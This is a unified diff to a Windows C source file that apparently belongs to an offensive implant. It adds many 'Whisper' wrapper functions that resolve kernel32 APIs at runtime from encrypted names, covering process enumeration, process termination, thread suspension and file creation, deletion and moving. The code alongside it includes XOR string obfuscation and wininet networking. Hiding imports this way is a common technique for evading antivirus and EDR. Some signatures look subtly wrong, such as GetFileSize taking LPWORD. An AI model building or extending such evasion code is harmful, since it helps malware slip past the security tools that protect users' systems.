@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <wininet.h>
+#include <tlhelp32.h> // For CreateToolhelp32Snapshot, Process32First, Process32Next
 
 // futureu notes:
 
@@ -124,6 +125,27 @@ typedef BOOL(WINAPI* HttpSendRequestA_t)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD
 typedef HINTERNET(WINAPI* InternetConnectA_t)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
 typedef HINTERNET(WINAPI* HttpOpenRequestA_t)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
 typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
+
+typedef HANDLE(WINAPI *OpenProcess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+typedef BOOL(WINAPI *TerminateProcess_t)(HANDLE hProcess, UINT uExitCode);
+typedef DWORD(WINAPI *SuspendThread_t)(HANDLE hThread);
+typedef DWORD(WINAPI *FormatMessageA_t)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
+typedef HANDLE(WINAPI *CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
+typedef BOOL(WINAPI *Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef BOOL(WINAPI *Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef DWORD(WINAPI *GetFileSize_t)(HANDLE hFile, LPWORD lpFileSizeHigh);
+typedef BOOL(WINAPI *DeleteFileA_t)(LPCSTR lpFileName);
+typedef BOOL(WINAPI *WriteFile_t)(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef BOOL(WINAPI *MoveFileA_t)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
+typedef BOOL(WINAPI *CopyFileA_t)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
+typedef HANDLE(WINAPI *FindFirstFileW_t)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
+typedef BOOL(WINAPI *FindNextFileW_t)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
+typedef BOOL(WINAPI *FindClose_t)(HANDLE hFindFile);
+typedef BOOL(WINAPI *SetCurrentDirectoryA_t)(LPCSTR lpPathName);
+typedef BOOL(WINAPI *CreateDirectoryA_t)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+typedef BOOL(WINAPI *RemoveDirectoryA_t)(LPCSTR lpPathName);
+typedef DWORD(WINAPI *GetCurrentDirectoryA_t)(DWORD nBufferLength, LPSTR lpBuffer); // From the previous example
+typedef HANDLE(WINAPI *CreateFileA_t)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 
 // -------------------------------------
 // Useful Notes ------------------------
@@ -340,7 +362,7 @@ void XorText(char *text, char key) {
 }
 
 
-FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
+FARPROC ResolveFunction(const wchar_t* module_name, const BYTE* function_name)
 {
     DEBUG_LOG("[+] Attempting to resolve function: %s\n", function_name);
 
@@ -510,7 +532,7 @@ BOOL WhisperCreateProcessA(
     DEBUG_LOG("[FUNC_CALL] WhisperCreateProcessA\n");
 
     if (!pCreateProcessA) {
-        pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", "CreateProcessA");
+        pCreateProcessA = (CreateProcessA_t)ResolveFunction(L"kernel32.dll", FUNC_CreateProcessA_ENCRYPTED_NAME);
         if (!pCreateProcessA)
             return FALSE;
     }
@@ -801,22 +823,6 @@ DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
     return pWaitForSingleObject(hHandle, dwMilliseconds);
 }
 
-// =====================================
-//  FILE MANAGEMENT
-// =====================================
-
-static ReadFile_t pReadFile = NULL;
-BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
-{
-    DEBUG_LOG("[FUNC_CALL] WhisperReadFile\n");
-    if (!pReadFile) {
-        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", FUNC_ReadFile_ENCRYPTED_NAME);
-        if (!pReadFile)
-            return FALSE;
-    }
-
-    return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
-}
 
 // Misc
 
@@ -835,6 +841,196 @@ int WhisperMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
 
 
     return pMessageBoxA(hWnd, lpText, lpCaption, uType);
+}
+
+// New Funcs
+static OpenProcess_t pOpenProcess = NULL;
+HANDLE WhisperOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
+    if (!pOpenProcess) {
+        pOpenProcess = (OpenProcess_t)ResolveFunction(L"kernel32.dll", FUNC_OpenProcess_ENCRYPTED_NAME);
+        if (!pOpenProcess) return NULL;
+    }
+    return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
+}
+
+static TerminateProcess_t pTerminateProcess = NULL;
+BOOL WhisperTerminateProcess(HANDLE hProcess, UINT uExitCode) {
+    if (!pTerminateProcess) {
+        pTerminateProcess = (TerminateProcess_t)ResolveFunction(L"kernel32.dll", FUNC_TerminateProcess_ENCRYPTED_NAME);
+        if (!pTerminateProcess) return FALSE;
+    }
+    return pTerminateProcess(hProcess, uExitCode);
+}
+
+static SuspendThread_t pSuspendThread = NULL;
+DWORD WhisperSuspendThread(HANDLE hThread) {
+    if (!pSuspendThread) {
+        pSuspendThread = (SuspendThread_t)ResolveFunction(L"kernel32.dll", FUNC_SuspendThread_ENCRYPTED_NAME);
+        if (!pSuspendThread) return (DWORD)-1; // Or appropriate error code
+    }
+    return pSuspendThread(hThread);
+}
+
+static FormatMessageA_t pFormatMessageA = NULL;
+DWORD WhisperFormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments) {
+    if (!pFormatMessageA) {
+        pFormatMessageA = (FormatMessageA_t)ResolveFunction(L"kernel32.dll", FUNC_FormatMessageA_ENCRYPTED_NAME);
+        if (!pFormatMessageA) return 0;
+    }
+    return pFormatMessageA(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments);
+}
+
+static CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = NULL;
+HANDLE WhisperCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
+    if (!pCreateToolhelp32Snapshot) {
+        pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)ResolveFunction(L"kernel32.dll", FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME);
+        if (!pCreateToolhelp32Snapshot) return INVALID_HANDLE_VALUE;
+    }
+    return pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
+}
+
+static Process32First_t pProcess32First = NULL;
+BOOL WhisperProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
+    if (!pProcess32First) {
+        pProcess32First = (Process32First_t)ResolveFunction(L"kernel32.dll", FUNC_Process32First_ENCRYPTED_NAME);
+        if (!pProcess32First) return FALSE;
+    }
+    return pProcess32First(hSnapshot, lppe);
+}
+
+static Process32Next_t pProcess32Next = NULL;
+BOOL WhisperProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
+    if (!pProcess32Next) {
+        pProcess32Next = (Process32Next_t)ResolveFunction(L"kernel32.dll", FUNC_Process32Next_ENCRYPTED_NAME);
+        if (!pProcess32Next) return FALSE;
+    }
+    return pProcess32Next(hSnapshot, lppe);
+}
+
+DWORD WhisperGetFileSize(HANDLE hFile, LPWORD lpFileSizeHigh) {
+    static GetFileSize_t pGetFileSize = NULL;
+    if (!pGetFileSize) {
+        pGetFileSize = (GetFileSize_t)ResolveFunction(L"kernel32.dll", FUNC_GetFileSize_ENCRYPTED_NAME);
+        if (!pGetFileSize) return INVALID_FILE_SIZE; // Or appropriate error
+    }
+    return pGetFileSize(hFile, lpFileSizeHigh);
+}
+
+BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
+    static ReadFile_t pReadFile = NULL;
+    if (!pReadFile) {
+        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", FUNC_ReadFile_ENCRYPTED_NAME);
+        if (!pReadFile) return FALSE;
+    }
+    return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
+}
+
+BOOL WhisperDeleteFileA(LPCSTR lpFileName) {
+    static DeleteFileA_t pDeleteFileA = NULL;
+    if (!pDeleteFileA) {
+        pDeleteFileA = (DeleteFileA_t)ResolveFunction(L"kernel32.dll", FUNC_DeleteFileA_ENCRYPTED_NAME);
+        if (!pDeleteFileA) return FALSE;
+    }
+    return pDeleteFileA(lpFileName);
+}
+
+BOOL WhisperWriteFile(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
+    static WriteFile_t pWriteFile = NULL;
+    if (!pWriteFile) {
+        pWriteFile = (WriteFile_t)ResolveFunction(L"kernel32.dll",FUNC_WriteFile_ENCRYPTED_NAME);
+        if (!pWriteFile) return FALSE;
+    }
+    return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
+}
+
+BOOL WhisperMoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName) {
+    static MoveFileA_t pMoveFileA = NULL;
+    if (!pMoveFileA) {
+        pMoveFileA = (MoveFileA_t)ResolveFunction(L"kernel32.dll",FUNC_MoveFileA_ENCRYPTED_NAME);
+        if (!pMoveFileA) return FALSE;
+    }
+    return pMoveFileA(lpExistingFileName, lpNewFileName);
+}
+
+BOOL WhisperCopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists) {
+    static CopyFileA_t pCopyFileA = NULL;
+    if (!pCopyFileA) {
+        pCopyFileA = (CopyFileA_t)ResolveFunction(L"kernel32.dll", FUNC_CopyFileA_ENCRYPTED_NAME);
+        if (!pCopyFileA) return FALSE;
+    }
+    return pCopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
+}
+
+HANDLE WhisperFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
+    static FindFirstFileW_t pFindFirstFileW = NULL;
+    if (!pFindFirstFileW) {
+        pFindFirstFileW = (FindFirstFileW_t)ResolveFunction(L"kernel32.dll", FUNC_FindFirstFileW_ENCRYPTED_NAME);
+        if (!pFindFirstFileW) return INVALID_HANDLE_VALUE;
+    }
+    return pFindFirstFileW(lpFileName, lpFindFileData);
+}
+
+BOOL WhisperFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
+    static FindNextFileW_t pFindNextFileW = NULL;
+    if (!pFindNextFileW) {
+        pFindNextFileW = (FindNextFileW_t)ResolveFunction(L"kernel32.dll", FUNC_FindNextFileW_ENCRYPTED_NAME);
+        if (!pFindNextFileW) return FALSE;
+    }
+    return pFindNextFileW(hFindFile, lpFindFileData);
+}
+
+BOOL WhisperFindClose(HANDLE hFindFile) {
+    static FindClose_t pFindClose = NULL;
+    if (!pFindClose) {
+        pFindClose = (FindClose_t)ResolveFunction(L"kernel32.dll", FUNC_FindClose_ENCRYPTED_NAME);
+        if (!pFindClose) return FALSE;
+    }
+    return pFindClose(hFindFile);
+}
+
+BOOL WhisperSetCurrentDirectoryA(LPCSTR lpPathName) {
+    static SetCurrentDirectoryA_t pSetCurrentDirectoryA = NULL;
+    if (!pSetCurrentDirectoryA) {
+        pSetCurrentDirectoryA = (SetCurrentDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME);
+        if (!pSetCurrentDirectoryA) return FALSE; // Or appropriate error code
+    }
+    return pSetCurrentDirectoryA(lpPathName);
+}
+
+BOOL WhisperCreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
+    static CreateDirectoryA_t pCreateDirectoryA = NULL;
+    if (!pCreateDirectoryA) {
+        pCreateDirectoryA = (CreateDirectoryA_t)ResolveFunction(L"kernel32.dll",FUNC_CreateDirectoryA_ENCRYPTED_NAME);
+        if (!pCreateDirectoryA) return FALSE;
+    }
+    return pCreateDirectoryA(lpPathName, lpSecurityAttributes);
+}
+
+BOOL WhisperRemoveDirectoryA(LPCSTR lpPathName) {
+    static RemoveDirectoryA_t pRemoveDirectoryA = NULL;
+    if (!pRemoveDirectoryA) {
+        pRemoveDirectoryA = (RemoveDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_RemoveDirectoryA_ENCRYPTED_NAME);
+        if (!pRemoveDirectoryA) return FALSE;
+    }
+    return pRemoveDirectoryA(lpPathName);
+}
+
+DWORD WhisperGetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer) { // From the previous example
+    static GetCurrentDirectoryA_t pGetCurrentDirectoryA = NULL;
+    if (!pGetCurrentDirectoryA) {
+        pGetCurrentDirectoryA = (GetCurrentDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME);
+        if (!pGetCurrentDirectoryA) return 0;
+    }
+    return pGetCurrentDirectoryA(nBufferLength, lpBuffer);
+}
+
+HANDLE WhisperCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
+    static CreateFileA_t pCreateFileA = NULL;
+    if (!pCreateFileA) {
+        pCreateFileA = (CreateFileA_t)ResolveFunction(L"kernel32.dll", FUNC_CreateFileA_ENCRYPTED_NAME);
+        if (!pCreateFileA) return INVALID_HANDLE_VALUE; // Or appropriate error code
+    }
+    return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
 }
 
 // =====================================
